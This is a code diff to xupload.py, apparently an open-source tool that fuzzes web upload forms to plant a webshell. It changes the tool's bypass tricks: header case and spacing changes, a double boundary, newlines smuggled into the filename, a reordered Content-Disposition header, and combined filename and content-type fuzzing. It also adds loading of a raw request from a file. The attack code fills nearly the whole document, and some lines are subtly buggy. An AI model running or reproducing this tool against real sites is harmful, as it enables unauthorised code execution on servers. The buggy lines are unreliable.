+        packet = work_packet.replace(origin_line, new_line)
+        packet = re.sub(b'filename="test.jpg"', b'filename="test.%s"' %
+                        script_suffix, packet)
     print('head头的content-type: multipart/form-DATA,并修改后缀为webshell后缀')
-    packet = work_packet.replace(origin_line, new_line)
-    packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
-                    script_suffix, packet)
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # head头的Content-Type: multipart/form-data;\n,并修改后缀为webshell后缀
-    origin_line = 'Content-Type: multipart/form-data; '
-    new_line = 'Content-Type: multipart/form-data;\n'
+    if not use_packet_file:
+        origin_line = 'Content-Type: multipart/form-data; '
+        new_line = 'Content-Type: multipart/form-data;\n'
+        packet = work_packet.replace(origin_line, new_line)
+        packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
+                        script_suffix, packet)
+    else:
+        origin_line = b'Content-Type: multipart/form-data; '
+        new_line = b'Content-Type: multipart/form-data;\n'
+        packet = work_packet.replace(origin_line, new_line)
+        packet = re.sub(b'filename="test.jpg"', b'filename="test.%s"' %
+                        script_suffix, packet)
     print('head头的Content-Type: multipart/form-data;\n,并修改后缀为webshell后缀')
-    packet = work_packet.replace(origin_line, new_line)
-    packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
-                    script_suffix, packet)
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # head头content-type空格:,并修改后缀为webshell后缀
-    origin_line = 'Content-Type: multipart/form-data;'
-    new_line = 'Content-Type : multipart/form-data;'
+    if not use_packet_file:
+        origin_line = 'Content-Type: multipart/form-data;'
+        new_line = 'Content-Type : multipart/form-data;'
+        packet = work_packet.replace(origin_line, new_line)
+        packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
+                        script_suffix, packet)
+    else:
+        origin_line = b'Content-Type: multipart/form-data;'
+        new_line = b'Content-Type : multipart/form-data;'
+        packet = work_packet.replace(origin_line, new_line)
+        packet = re.sub(b'filename="test.jpg"', b'filename="test.%s"' %
+                        script_suffix, packet)
     print('head头content-type空格:,并修改后缀为webshell后缀')
-    packet = work_packet.replace(origin_line, new_line)
-    packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
-                    script_suffix, packet)
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # form-data字段与name字段交换位置,并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-    new_line = 'name="%s"; Content-Disposition: form-data; filename="test.%s"' % (
-        form_file_param_name, script_suffix)
-    print('form-data字段与name字段交换位置,并修改后缀为webshell后缀')
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = 'name="%s"; Content-Disposition: form-data; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = b'name="%s"; Content-Disposition: form-data; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
+    print('form-data字段与name字段交换位置,并修改后缀为webshell后缀')
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 双boundary,并修改后缀为webshell后缀
-    origin_line = '--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
-        boundary, form_file_param_name)
-    new_line = '--%s\r\n--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
-        boundary, boundary, form_file_param_name)
+    if not use_packet_file:
+        origin_line = '--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
+            boundary, form_file_param_name)
+        new_line = '--%s\r\n--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
+            boundary, boundary, form_file_param_name)
+        packet = work_packet.replace(origin_line, new_line)
+        packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
+                        script_suffix, packet)
+    else:
+        origin_line = b'--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
+            boundary, form_file_param_name)
+        new_line = b'--%s\r\n--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (
+            boundary, boundary, form_file_param_name)
+        packet = work_packet.replace(origin_line, new_line)
+        packet = re.sub(b'filename="test.jpg"', b'filename="test.%s"' %
+                        script_suffix, packet)
     print('双boundary,并修改后缀为webshell后缀')
-    packet = work_packet.replace(origin_line, new_line)
-    packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
-                    script_suffix, packet)
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 修改成形如'Content-Disposition: form-data; name="image";
     # filename="085733uykwusqcs8vw8wky.png\r\nC.php"'
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
-    new_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg\r\nC.%s"' % (
-        form_file_param_name, script_suffix)
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
+        new_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg\r\nC.%s"' % (
+            form_file_param_name, script_suffix)
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
+        new_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg\r\nC.%s"' % (
+            form_file_param_name, script_suffix)
+    packet = work_packet.replace(origin_line, new_line)
     print('修改成形如Content-Disposition: form-data; name="%s"; filename="test.jpg\r\nC.%s"' %
           (form_file_param_name, script_suffix))
-    packet = work_packet.replace(origin_line, new_line)
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 修改filename为file\nname,并修改后缀为webshell后缀
-    filename_item = {'desc': '修改filename为file\nname', 'modify': {
-        'filename': 'file\nname="test.%s"' % script_suffix}}
-    print(filename_item['desc'])
-    packet = work_packet.replace(
-        'filename="test.jpg"', filename_item['modify']['filename'])
+    if not use_packet_file:
+        origin_line = 'filename="test.jpg"'
+        new_line = 'file\nname="test.%s"' % script_suffix
+    else:
+        origin_line = b'filename="test.jpg"'
+        new_line = b'file\nname="test.%s"' % script_suffix
+    work_packet.replace(origin_line, new_line)
+    print('修改filename为file\nname')
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # filename在content-type下面,并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
-    print('filename在content-type下面,并修改后缀为webshell后缀')
-    new_line = 'Content-Disposition: form-data; name="%s";\r\nContent-Type: image/jpeg\r\nfilename="test.%s"' % (
-        form_file_param_name, script_suffix)
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
+        new_line = 'Content-Disposition: form-data; name="%s";\r\nContent-Type: image/jpeg\r\nfilename="test.%s"' % (
+            form_file_param_name, script_suffix)
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
+        new_line = b'Content-Disposition: form-data; name="%s";\r\nContent-Type: image/jpeg\r\nfilename="test.%s"' % (
+            form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
+    print('filename在content-type下面,并修改后缀为webshell后缀')
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # boundary和content-disposition中间插入换行
-    print("boundary和content-disposition中间插入换行,并修改后缀为webshell后缀")
-    origin_string = "--" + boundary + \
-        '\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-    new_string = "--" + boundary + \
-        '\r\n\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"' % (
-            form_file_param_name, script_suffix)
+    if not use_packet_file:
+        origin_string = '--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (boundary,form_file_param_name)
+        new_string = '--%s\r\n\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"' % (boundary,form_file_param_name, script_suffix)
+    else:
+        origin_string = b'--%s\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % (boundary,form_file_param_name)
+        new_string = b'--%s\r\n\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"' % (boundary,form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_string, new_string)
+    print("boundary和content-disposition中间插入换行,并修改后缀为webshell后缀")
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
@@ -749,16 +941,27 @@ def fuzz_upload_webshell():
     # 修改filename且修改content-type
     for filename_item in fuzz_file_name:
         for content_type_item in fuzz_content_type:
+            if not use_packet_file:
+                filename = filename_item['modify']['filename']
+                content_type = content_type_item['modify']['content_type']
+                file_content = work_file_info['file_content']
+                packet = re.sub(
+                    r'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
+                # 如果content-type中有\x5c,正则替换时要处理下,要不然python会报错
+                content_type = re.sub(r"\x5c", "\\" * 8, content_type)
+                packet = re.sub(r"(?<=Content-Type: )\S+(?=\r\n)",
+                                content_type, packet)
+            else:
+                filename = unicode_to_bytes(filename_item['modify']['filename'])
+                content_type = unicode_to_bytes(content_type_item['modify']['content_type'])
+                file_content = work_file_info['file_content']
+                packet = re.sub(
+                    b'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
+                # 如果content-type中有\x5c,正则替换时要处理下,要不然python会报错
+                content_type = re.sub(b"\x5c", b"\\" * 8, content_type)
+                packet = re.sub(b"(?<=Content-Type: )\S+(?=\r\n)",
+                                content_type, packet)
             print(filename_item['desc'] + "  &&  " + content_type_item['desc'])
-            filename = filename_item['modify']['filename']
-            content_type = content_type_item['modify']['content_type']
-            file_content = work_file_info['file_content']
-            packet = re.sub(
-                r'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
-            # 如果content-type中有\x5c,正则替换时要处理下,要不然python会报错
-            content_type = re.sub(r"\x5c", "\\" * 8, content_type)
-            packet = re.sub(r"(?<=Content-Type: )\S+(?=\r\n)",
-                            content_type, packet)
             rsp = post_multipart_form_data(packet)
             check_upload_succeed(packet, rsp, origin_html)
 
@@ -766,7 +969,7 @@ def fuzz_upload_webshell():
 parser = argparse.ArgumentParser(
     description="xupload.py is a program that automates the testing of uploading functionality. If xupload.py does not successfully upload webshell, try more tips at:\n1.http://3xp10it.cc/web/2016/08/12/fckeditor各版本绕过/\n2.https://paper.seebug.org/219/\n3.http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf\n4.https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/")
 parser.add_argument(
-    "-u", "--url", required=True, help="The target url which has upload function")
+    "-u", "--url", help="The target url which has upload function")
 parser.add_argument(
     "--cookie", help="HTTP Cookie header value")
 parser.add_argument(
@@ -776,13 +979,15 @@ parser.add_argument(
 parser.add_argument(
     "--delay", help="Delay in seconds between each HTTP request")
 parser.add_argument(
+    "--force-ssl", help="Force usage of SSL/HTTPS", action="store_true")
+parser.add_argument(
     "-r", help="Load HTTP request from a file")
 args = parser.parse_args()
 url = args.url
 cookie = args.cookie
 script_suffix = args.suffix
 delay = args.delay
-packet_file = args.r
+use_packet_file = args.r
 
 """
 gif_file_content,jpg_file_content,png_file_content都是从正常的对应文件的16进制中
@@ -811,20 +1016,29 @@ gif_file_content = '\x47\x49\x46\x38\x39\x61\xc8\x00\xc8\x00\xf7\x00\x00\x00\x00
 jpg_file_content = '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x4b\xff\x00\x7f\x3f\xfa\xf4\x57\x46\x60\x83\x27\xf7\x29\xff\x00\x7c\x8a\x2b\x4b\x3e\xe3\xe6\x3f\xff\xd9'
 png_file_content = '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x01\x18\x00\x00\x00\xd2\x08\x06\x00\x00\x00\x91\x8a\xdf\x65\x00\x31\x38\x30\x4b\x42\x42\xb9\xfe\x05\x3d\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82'
 
-if packet_file:
-    work_packet_bytes = b""
-    with open(packet_file, "rb") as f:
+if use_packet_file:
+    packet_file_bytes = b""
+    with open(use_packet_file, "rb") as f:
         byte = f.read(1)
         while byte != b"":
-            work_packet_bytes+=byte
+            packet_file_bytes += byte
             byte = f.read(1)
-    pdb.set_trace()
-    work_packet_bytes= re.sub(b"\r\n", b"\n", work_packet_bytes)
-    work_packet_bytes= re.sub(b"\n", b"\r\n", work_packet_bytes)
+    packet_file_bytes = re.sub(b"\r\n", b"\n", packet_file_bytes)
+    packet_file_bytes = re.sub(b"\n", b"\r\n", packet_file_bytes)
+    uri = re.search(b'^\S+\s+(\S+)\s+HTTP', packet_file_bytes).group(1)
+    host = re.search(b'Host: ([^\r\s]+)', packet_file_bytes).group(1)
+    if args.force_ssl:
+        url = b'https://' + host + uri
+    else:
+        if b'http://' + host in packet_file_bytes:
+            url = b'http://' + host + uri
+        elif b'https://' + host in packet_file_bytes:
+            url = b'https' + host + uri
+    url = url.decode('utf8')
     boundary = re.search(
-        b"Content-Type: multipart/form-data; boundary=([^\r\n]+)", work_packet_bytes, re.I).group(1)
+        b"Content-Type: multipart/form-data; boundary=([^\r\n]+)", packet_file_bytes, re.I).group(1)
     form_file_param_name = re.search(
-        b'''Content-Disposition: form-data; name="([^"]+)"; filename=.*''', work_packet_bytes, re.I).group(1)
+        b'''Content-Disposition: form-data; name="([^"]+)"; filename=.*''', packet_file_bytes, re.I).group(1)
 else:
     info = get_form_data_post_info(url, cookie)
     form_data_dict = info['form_data_dict']
